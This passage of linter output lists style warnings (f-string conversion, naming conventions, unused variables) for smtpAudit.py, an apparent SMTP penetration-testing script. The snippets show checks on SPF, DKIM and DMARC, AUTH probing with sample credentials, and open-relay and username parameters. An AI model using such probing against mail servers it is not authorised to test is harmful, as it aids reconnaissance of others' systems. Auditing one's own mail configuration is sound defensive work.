583 |                 if v.lower() not in ("none", "reject", "quarantine"):
584 |                     fail("UNSECURE: Unknown policy stated: {}".format(v))
    |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
585 |                     self.results["policy-rejects-by-default"] = False
586 |                 else:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:591:29
    |
589 |                       if not self.results["policy-rejects-by-default"]:
590 |                           fail(
591 | /                             "UNSECURE: DMARC policy does not reject unverified messages ({}).".format(
592 | |                                 v
593 | |                             )
    | |_____________________________^
594 |                           )
595 |               elif k == "pct":
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:602:29
    |
600 |                       if self.results["number-of-messages-filtered"]:
601 |                           info(
602 | /                             "Percentage of filtered messages is satisfiable ({})".format(
603 | |                                 perc
604 | |                             )
    | |_____________________________^
605 |                           )
606 |                       else:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:608:29
    |
606 |                       else:
607 |                           fail(
608 | /                             "UNSECURE: Unsatisfiable percentage of messages filtered: {}!".format(
609 | |                                 perc
610 | |                             )
    | |_____________________________^
611 |                           )
    |
help: Convert to f-string

N815 Variable `minimumDkimKeyLength` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:624:5
    |
623 | class DkimParser:
624 |     minimumDkimKeyLength = 1024
    |     ^^^^^^^^^^^^^^^^^^^^
625 |
626 |     def __init__(self):
    |

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\networks\smtpAudit.py:647:12
    |
645 |             dkim[k] = v
646 |
647 |         if "p" not in dkim.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^
648 |             return False
    |
help: Remove `.keys()`

N806 Variable `keyLen` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:651:9
    |
650 |         pubkey = base64.b64decode(dkim["p"])
651 |         keyLen = (len(pubkey) - 38) * 8  # 38 bytes is for key's metadata
    |         ^^^^^^
652 |
653 |         if keyLen < 0:
    |

N806 Variable `keyLen` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:655:13
    |
653 |         if keyLen < 0:
654 |             fail("Incorrect Public Key in DKIM!")
655 |             keyLen = 0
    |             ^^^^^^
656 |
657 |         dbg(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:665:17
    |
663 |           if keyLen < DkimParser.minimumDkimKeyLength:
664 |               fail(
665 | /                 "UNSECURE: DKIM Public Key length is insufficient: {}. "
666 | |                 "Recommended at least {}".format(
667 | |                     keyLen, DkimParser.minimumDkimKeyLength
668 | |                 )
    | |_________________^
669 |               )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:673:16
    |
671 |             self.results["public-key-length"] = False
672 |         else:
673 |             ok("SECURE: DKIM Public key is of sufficient length: {}".format(keyLen))
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
674 |             self.results["public-key-length"] = True
    |
help: Convert to f-string

N815 Variable `maxNumberOfDomainsAllowed` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:681:5
    |
679 | class SpfParser:
680 |     # maxAllowedNetworkMask = 28
681 |     maxNumberOfDomainsAllowed = 3
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^
682 |
683 |     allowedHostsNumber = 0
    |

N815 Variable `allowedHostsNumber` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:683:5
    |
681 |     maxNumberOfDomainsAllowed = 3
682 |
683 |     allowedHostsNumber = 0
    |     ^^^^^^^^^^^^^^^^^^
684 |     allowSpecifiers = 0
    |

N815 Variable `allowSpecifiers` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:684:5
    |
683 |     allowedHostsNumber = 0
684 |     allowSpecifiers = 0
    |     ^^^^^^^^^^^^^^^
685 |
686 |     mechanisms = ("all", "ip4", "ip6", "a", "mx", "ptr", "exists", "include")
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:708:13
    |
706 |         tokens = record.split(" ")
707 |
708 |         dbg('Processing SPF record: "{}"'.format(record))
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
709 |
710 |         for token in tokens:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:715:17
    |
713 |                 continue
714 |
715 |             dbg("SPF token: {}".format(token))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
716 |
717 |             if token.startswith("v=spf"):
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:726:21
    |
724 |               ):
725 |                   fail(
726 | /                     'SPF record contains unknown qualifier: "{}". Ignoring it...'.format(
727 | |                         token[0]
728 | |                     )
    | |_____________________^
729 |                   )
    |
help: Convert to f-string

N806 Variable `maxAllowed` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:750:13
    |
748 |         if not self.results["allowed-hosts-list"]:
749 |             # maxAllowed = 2 ** (32 - SpfParser.maxAllowedNetworkMask)
750 |             maxAllowed = config["spf_maximum_hosts"]
    |             ^^^^^^^^^^
751 |
752 |             fail(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:753:17
    |
752 |               fail(
753 | /                 "UNSECURE: SPF record allows more than {} max allowed hosts: {} in total.".format(
754 | |                     maxAllowed, self.allowedHostsNumber
755 | |                 )
    | |_________________^
756 |               )
757 |               _out('\tRecord: ("{}")'.format(record))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:757:18
    |
755 |                 )
756 |             )
757 |             _out('\tRecord: ("{}")'.format(record))
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
758 |
759 |         if not self.results["allowed-hosts-list"]:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:761:17
    |
759 |           if not self.results["allowed-hosts-list"]:
760 |               fail(
761 | /                 "There are too many allowed domains/CIDR ranges specified in SPF record: {}.".format(
762 | |                     self.allowSpecifiers
763 | |                 )
    | |_________________^
764 |               )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:771:21
    |
769 |         else:
770 |             if not all(self.results.values()):
771 |                 dbg("Not all tests passed.: {}".format(self.results))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
772 |             else:
773 |                 dbg("All tests passed.")
    |
help: Convert to f-string

N806 Variable `otherMechanisms` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:779:9
    |
777 |     def areThereAnyOtherMechanismsThan(self, mechanism, record):
778 |         tokens = record.split(" ")
779 |         otherMechanisms = 0
    |         ^^^^^^^^^^^^^^^
780 |
781 |         for token in tokens:
    |

N806 Variable `otherMechanisms` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:794:25
    |
792 |                 for s in token.split(":"):
793 |                     if s in SpfParser.mechanisms:
794 |                         otherMechanisms += 1
    |                         ^^^^^^^^^^^^^^^
795 |                         break
    |

N806 Variable `otherMechanisms` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:800:25
    |
798 |                 for s in token.split("/"):
799 |                     if s in SpfParser.mechanisms:
800 |                         otherMechanisms += 1
    |                         ^^^^^^^^^^^^^^^
801 |                         break
    |

N806 Variable `otherMechanisms` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:804:17
    |
803 |             if token in SpfParser.mechanisms:
804 |                 otherMechanisms += 1
    |                 ^^^^^^^^^^^^^^^
805 |
806 |         dbg('Found {} other mechanisms than "{}"'.format(otherMechanisms, mechanism))
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:806:13
    |
804 |                 otherMechanisms += 1
805 |
806 |         dbg('Found {} other mechanisms than "{}"'.format(otherMechanisms, mechanism))
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
807 |         return otherMechanisms > 0
    |
help: Convert to f-string

N806 Variable `validVersions` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:811:9
    |
809 |     def processVersion(self, token):
810 |         v, ver = token.split("=")
811 |         validVersions = "1"
    |         ^^^^^^^^^^^^^
812 |
813 |         for version in validVersions:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:814:16
    |
813 |         for version in validVersions:
814 |             if "spf{}".format(version) == ver:
    |                ^^^^^^^^^^^^^^^^^^^^^^^
815 |                 dbg("SPF version was found valid.")
816 |                 return True
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:824:17
    |
822 |           if not record.endswith(token):
823 |               fail(
824 | /                 'SPF Record wrongly stated - "{}" mechanism must be placed at the end!'.format(
825 | |                     token
826 | |                 )
    | |_________________^
827 |               )
828 |               return False
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:832:17
    |
830 |           if token == "all" and qualifier == "+":
831 |               fail(
832 | /                 'UNSECURE: SPF too permissive: "The domain owner thinks that SPF is useless and/or doesn\'t care.": "{}"'.format(
833 | |                     record
834 | |                 )
    | |_________________^
835 |               )
836 |               return False
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:840:17
    |
838 |           if not self.areThereAnyOtherMechanismsThan("all", record):
839 |               fail(
840 | /                 'SPF "all" mechanism is too restrictive: "The domain sends no mail at all.": "{}"'.format(
841 | |                     record
842 | |                 ),
    | |_________________^
843 |                   toOutLine=True,
844 |               )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:850:13
    |
849 |     def getNetworkSize(self, net):
850 |         dbg("Getting network size out of: {}".format(net))
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
851 |         m = re.match(r"[\w\.-:]+\/(\d{1,2})", net)
852 |         if m:
    |
help: Convert to f-string

F841 Local variable `key` is assigned to but never used
   --> security\penetration-testing-tools\networks\smtpAudit.py:860:9
    |
859 |     def processMechanism(self, record, token, qualifier):
860 |         key, value = None, None
    |         ^^^
861 |         addressBasedMechanisms = ("ip4", "ip6", "a", "mx")
862 |         numOfAddrBasedMechanisms = len(
    |
help: Remove assignment to unused variable `key`

F841 Local variable `value` is assigned to but never used
   --> security\penetration-testing-tools\networks\smtpAudit.py:860:14
    |
859 |     def processMechanism(self, record, token, qualifier):
860 |         key, value = None, None
    |              ^^^^^
861 |         addressBasedMechanisms = ("ip4", "ip6", "a", "mx")
862 |         numOfAddrBasedMechanisms = len(
    |
help: Remove assignment to unused variable `value`

N806 Variable `addressBasedMechanisms` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:861:9
    |
859 |     def processMechanism(self, record, token, qualifier):
860 |         key, value = None, None
861 |         addressBasedMechanisms = ("ip4", "ip6", "a", "mx")
    |         ^^^^^^^^^^^^^^^^^^^^^^
862 |         numOfAddrBasedMechanisms = len(
863 |             list(filter(lambda x: token.startswith(x), addressBasedMechanisms))
    |

N806 Variable `numOfAddrBasedMechanisms` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:862:9
    |
860 |         key, value = None, None
861 |         addressBasedMechanisms = ("ip4", "ip6", "a", "mx")
862 |         numOfAddrBasedMechanisms = len(
    |         ^^^^^^^^^^^^^^^^^^^^^^^^
863 |             list(filter(lambda x: token.startswith(x), addressBasedMechanisms))
864 |         )
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:876:25
    |
874 |                     self.checkTooManyAllowedHosts(token, record, qualifier)
875 |                 else:
876 |                     dbg('Mechanism: "{}" not being passed.'.format(token))
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
877 |
878 |     def checkTooManyAllowedHosts(self, token, record, qualifier):
    |
help: Convert to f-string

E712 Avoid inequality comparisons to `True`; use `not self.results["allowed-hosts-list"]:` for false checks
   --> security\penetration-testing-tools\networks\smtpAudit.py:879:12
    |
878 |     def checkTooManyAllowedHosts(self, token, record, qualifier):
879 |         if self.results["allowed-hosts-list"] != True:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
880 |             return
    |
help: Replace with `not self.results["allowed-hosts-list"]`

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\networks\smtpAudit.py:886:35
    |
884 |         if ":" in token:
885 |             tok, val = token.split(":")
886 |         elif "/" in token and not ":" in token:
    |                                   ^^^^^^^^^^^^
887 |             tok, val = token.split("/")
888 |             val = "0/{}".format(val)
    |
help: Convert to `not in`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:888:19
    |
886 |         elif "/" in token and not ":" in token:
887 |             tok, val = token.split("/")
888 |             val = "0/{}".format(val)
    |                   ^^^^^^^^^^^^^^^^^^
889 |         elif token in SpfParser.mechanisms:
890 |             tok = token
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:893:17
    |
891 |             val = "0/32"
892 |         else:
893 |             err("Invalid address-based mechanism: {}!".format(token))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
894 |             return
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:896:13
    |
894 |             return
895 |
896 |         dbg('Processing SPF mechanism: "{}" with value: "{}"'.format(tok, val))
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
897 |
898 |         size = self.getNetworkSize(val)
    |
help: Convert to f-string

N806 Variable `maxAllowed` in function should be lowercase
   --> security\penetration-testing-tools\networks\smtpAudit.py:900:9
    |
898 |         size = self.getNetworkSize(val)
899 |         # maxAllowed = 2 ** (32 - SpfParser.maxAllowedNetworkMask)
900 |         maxAllowed = config["spf_maximum_hosts"]
    |         ^^^^^^^^^^
901 |
902 |         self.allowedHostsNumber += size
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\smtpAudit.py:906:17
    |
904 |               self.results["minimum-allowed-hosts-list"] = False
905 |               fail(
906 | /                 "UNSECURE: Too many hosts allowed in directive: {} - total: {}".format(
907 | |                     token, size
908 | |                 )
    | |_________________^
909 |               )
    |
help: Convert to f-string

N815 Variable `testsConducted` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:913:5
    |
912 | class SmtpTester:
913 |     testsConducted = {
    |     ^^^^^^^^^^^^^^
914 |         "spf": "SPF DNS record test",
915 |         "dkim": "DKIM DNS record test",
    |

N815 Variable `connectionLessTests` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:930:5
    |
928 |     }
929 |
930 |     connectionLessTests = ("spf", "dkim", "dmarc")
    |     ^^^^^^^^^^^^^^^^^^^
931 |
932 |     # 25 - plain text SMTP
    |

N815 Variable `commonSmtpPorts` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:935:5
    |
933 |     # 465 - SMTP over SSL
934 |     # 587 - SMTP-AUTH / Submission
935 |     commonSmtpPorts = (
    |     ^^^^^^^^^^^^^^^
936 |         25,
937 |         465,
    |

N815 Variable `commonSmtpAuthMethods` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:942:5
    |
941 |     # Common AUTH X methods with sample Base64 authentication data.
942 |     commonSmtpAuthMethods = {
    |     ^^^^^^^^^^^^^^^^^^^^^
943 |         "PLAIN": base64.b64encode("\0user\0password".encode()),
944 |         "LOGIN": (
    |

UP012 [*] Unnecessary call to `encode` as UTF-8
   --> security\penetration-testing-tools\networks\smtpAudit.py:943:35
    |
941 |     # Common AUTH X methods with sample Base64 authentication data.
942 |     commonSmtpAuthMethods = {
943 |         "PLAIN": base64.b64encode("\0user\0password".encode()),
    |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^
944 |         "LOGIN": (
945 |             (base64.b64encode("user".encode()), base64.b64encode("password".encode())),
    |
help: Rewrite as bytes literal

UP012 [*] Unnecessary call to `encode` as UTF-8
   --> security\penetration-testing-tools\networks\smtpAudit.py:945:31
    |
943 |         "PLAIN": base64.b64encode("\0user\0password".encode()),
944 |         "LOGIN": (
945 |             (base64.b64encode("user".encode()), base64.b64encode("password".encode())),
    |                               ^^^^^^^^^^^^^^^
946 |             ("user@DOMAIN.COM", base64.b64encode("password".encode())),
947 |         ),
    |
help: Rewrite as bytes literal

UP012 [*] Unnecessary call to `encode` as UTF-8
   --> security\penetration-testing-tools\networks\smtpAudit.py:945:66
    |
943 |         "PLAIN": base64.b64encode("\0user\0password".encode()),
944 |         "LOGIN": (
945 |             (base64.b64encode("user".encode()), base64.b64encode("password".encode())),
    |                                                                  ^^^^^^^^^^^^^^^^^^^
946 |             ("user@DOMAIN.COM", base64.b64encode("password".encode())),
947 |         ),
    |
help: Rewrite as bytes literal

UP012 [*] Unnecessary call to `encode` as UTF-8
   --> security\penetration-testing-tools\networks\smtpAudit.py:946:50
    |
944 |         "LOGIN": (
945 |             (base64.b64encode("user".encode()), base64.b64encode("password".encode())),
946 |             ("user@DOMAIN.COM", base64.b64encode("password".encode())),
    |                                                  ^^^^^^^^^^^^^^^^^^^
947 |         ),
948 |         "NTLM": (
    |
help: Rewrite as bytes literal

N815 Variable `smtpAuthServices` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:957:5
    |
955 |     }
956 |
957 |     smtpAuthServices = ("AUTH", "X-EXPS")
    |     ^^^^^^^^^^^^^^^^
958 |     authMethodsNotNeedingStarttls = ("NTLM", "GSSAPI")
    |

N815 Variable `authMethodsNotNeedingStarttls` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:958:5
    |
957 |     smtpAuthServices = ("AUTH", "X-EXPS")
958 |     authMethodsNotNeedingStarttls = ("NTLM", "GSSAPI")
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
959 |
960 |     # Pretend you are the following host:
    |

N815 Variable `pretendLocalHostname` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:961:5
    |
960 |     # Pretend you are the following host:
961 |     pretendLocalHostname = config["pretend_client_hostname"]
    |     ^^^^^^^^^^^^^^^^^^^^
962 |
963 |     maxStarttlsRetries = 5
    |

N815 Variable `maxStarttlsRetries` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:963:5
    |
961 |     pretendLocalHostname = config["pretend_client_hostname"]
962 |
963 |     maxStarttlsRetries = 5
    |     ^^^^^^^^^^^^^^^^^^
964 |
965 |     # Source: SSLabs research:
    |

N815 Variable `secureCipherSuitesList` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\smtpAudit.py:967:5
    |
965 |     # Source: SSLabs research:
966 |     #   https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices
967 |     secureCipherSuitesList = (
    |     ^^^^^^^^^^^^^^^^^^^^^^
968 |         "ECDHE-ECDSA-AES128-GCM-SHA256",
969 |         "ECDHE-ECDSA-AES256-GCM-SHA384",
    |

N803 Argument name `forceSSL` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1010:9
     |
1008 |         hostname,
1009 |         port=None,
1010 |         forceSSL=False,
     |         ^^^^^^^^^^^^^^
1011 |         dkimSelectorsList=None,
1012 |         userNamesList=None,
     |

N803 Argument name `dkimSelectorsList` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1011:9
     |
1009 |         port=None,
1010 |         forceSSL=False,
1011 |         dkimSelectorsList=None,
     |         ^^^^^^^^^^^^^^^^^^^^^^
1012 |         userNamesList=None,
1013 |         openRelayParams=("", ""),
     |

N803 Argument name `userNamesList` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1012:9
     |
1010 |         forceSSL=False,
1011 |         dkimSelectorsList=None,
1012 |         userNamesList=None,
     |         ^^^^^^^^^^^^^^^^^^
1013 |         openRelayParams=("", ""),
1014 |         connect=True,
     |

N803 Argument name `openRelayParams` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1013:9
     |
1011 |         dkimSelectorsList=None,
1012 |         userNamesList=None,
1013 |         openRelayParams=("", ""),
     |         ^^^^^^^^^^^^^^^^^^^^^^^^
1014 |         connect=True,
1015 |         mailDomain="",
     |

N803 Argument name `mailDomain` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1015:9
     |
1013 |         openRelayParams=("", ""),
1014 |         connect=True,
1015 |         mailDomain="",
     |         ^^^^^^^^^^^^^
1016 |     ):
1017 |         self.originalHostname = hostname
     |

N806 Variable `needsConnection` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1074:9
     |
1072 |             self.resolvedIPAddress = hostname
1073 |
1074 |         needsConnection = False
     |         ^^^^^^^^^^^^^^^
1075 |         for test in SmtpTester.testsConducted.keys():
1076 |             if (
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1075:13
     |
1074 |         needsConnection = False
1075 |         for test in SmtpTester.testsConducted.keys():
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1076 |             if (
1077 |                 self.checkIfTestToRun(test)
     |
help: Remove `.keys()`

N806 Variable `needsConnection` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1080:17
     |
1078 |                 and test not in SmtpTester.connectionLessTests
1079 |             ):
1080 |                 needsConnection = True
     |                 ^^^^^^^^^^^^^^^
1081 |                 break
     |

N806 Variable `resolutionFailed` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1106:13
     |
1104 |     def resolveDomainName(self):
1105 |         if self.hostname:
1106 |             resolutionFailed = False
     |             ^^^^^^^^^^^^^^^^
1107 |
1108 |             if re.match(
     |

W605 [*] Invalid escape sequence: `\.`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1109:29
     |
1108 |             if re.match(
1109 |                 "^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$", self.hostname
     |                             ^^
1110 |             ):
1111 |                 resolved = None
     |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\.`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1109:41
     |
1108 |             if re.match(
1109 |                 "^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$", self.hostname
     |                                         ^^
1110 |             ):
1111 |                 resolved = None
     |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\.`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1109:53
     |
1108 |             if re.match(
1109 |                 "^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$", self.hostname
     |                                                     ^^
1110 |             ):
1111 |                 resolved = None
     |
help: Use a raw string literal

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1115:26
     |
1113 |                     resolved = socket.gethostbyaddr(self.hostname)
1114 |                     self.remoteHostname = repr(resolved[0]).replace("'", "")
1115 |                     info('Resolved DNS (A) name: "{}"'.format(self.remoteHostname))
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1116 |
1117 |                 except socket.herror as e:
     |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\networks\smtpAudit.py:1117:41
     |
1115 |                     info('Resolved DNS (A) name: "{}"'.format(self.remoteHostname))
1116 |
1117 |                 except socket.herror as e:
     |                                         ^
1118 |                     dbg("IP address could not be resolved into hostname.")
1119 |                     resolutionFailed = True
     |
help: Remove assignment to unused variable `e`

N806 Variable `resolutionFailed` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1119:21
     |
1117 |                 except socket.herror as e:
1118 |                     dbg("IP address could not be resolved into hostname.")
1119 |                     resolutionFailed = True
     |                     ^^^^^^^^^^^^^^^^
1120 |             else:
1121 |                 try:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1123:26
     |
1121 |                 try:
1122 |                     resolved = socket.gethostbyname(self.hostname)
1123 |                     info('Resolved IP address / PTR: "{}"'.format(resolved))
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1124 |                     self.resolvedIPAddress = resolved
1125 |                 except socket.herror as e:
     |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\networks\smtpAudit.py:1125:41
     |
1123 |                     info('Resolved IP address / PTR: "{}"'.format(resolved))
1124 |                     self.resolvedIPAddress = resolved
1125 |                 except socket.herror as e:
     |                                         ^
1126 |                     dbg("DNS name could not be resolved into IP address.")
     |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1134:25
     |
1132 |                       self.localHostname = matched.group(1)
1133 |                       info(
1134 | /                         'SMTP banner revealed server name: "{}".'.format(
1135 | |                             self.localHostname
1136 | |                         )
     | |_________________________^
1137 |                       )
     |
help: Convert to f-string

N803 Argument name `getDNSValidHostname` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1155:18
     |
1153 |         return True
1154 |
1155 |     def printDNS(getDNSValidHostname):
     |                  ^^^^^^^^^^^^^^^^^^^
1156 |         def wrapper(self, noRemote=True):
1157 |             out = getDNSValidHostname(self, noRemote)
     |

N805 First argument of a method should be named `self`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1155:18
     |
1153 |         return True
1154 |
1155 |     def printDNS(getDNSValidHostname):
     |                  ^^^^^^^^^^^^^^^^^^^
1156 |         def wrapper(self, noRemote=True):
1157 |             out = getDNSValidHostname(self, noRemote)
     |
help: Rename `getDNSValidHostname` to `self`

N803 Argument name `noRemote` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1156:27
     |
1155 |     def printDNS(getDNSValidHostname):
1156 |         def wrapper(self, noRemote=True):
     |                           ^^^^^^^^^^^^^
1157 |             out = getDNSValidHostname(self, noRemote)
1158 |             if config["smtp_debug"]:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1159:21
     |
1157 |             out = getDNSValidHostname(self, noRemote)
1158 |             if config["smtp_debug"]:
1159 |                 dbg('Using hostname: "{}" for DNS query.'.format(out))
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1160 |             return out
     |
help: Convert to f-string

N803 Argument name `noRemote` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1165:35
     |
1164 |     @printDNS
1165 |     def getDNSValidHostname(self, noRemote=False):
     |                                   ^^^^^^^^^^^^^^
1166 |         if self.localHostname:
1167 |             return self.localHostname
     |

N806 Variable `allOfThem` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1181:9
     |
1180 |     def getAllPossibleDomainNames(self):
1181 |         allOfThem = [
     |         ^^^^^^^^^
1182 |             self.originalHostname,  # 0
1183 |             self.hostname,  # 1
     |

N806 Variable `domainsToReview` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1207:9
     |
1205 |             ]
1206 |
1207 |         domainsToReview = [self.originalHostname]
     |         ^^^^^^^^^^^^^^^
1208 |         doFullReview = False
1209 |         ipRex = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"
     |

N806 Variable `doFullReview` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1208:9
     |
1207 |         domainsToReview = [self.originalHostname]
1208 |         doFullReview = False
     |         ^^^^^^^^^^^^
1209 |         ipRex = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"
     |

N806 Variable `ipRex` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1209:9
     |
1207 |         domainsToReview = [self.originalHostname]
1208 |         doFullReview = False
1209 |         ipRex = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"
     |         ^^^^^
1210 |
1211 |         if config["dns_full"] == "always" or (
     |

N806 Variable `doFullReview` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1214:13
     |
1212 |             config["dns_full"] == "on-ip" and re.match(ipRex, self.originalHostname)
1213 |         ):
1214 |             doFullReview = True
     |             ^^^^^^^^^^^^
1215 |
1216 |         if doFullReview:
     |

N806 Variable `domainsToReview` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1217:13
     |
1216 |         if doFullReview:
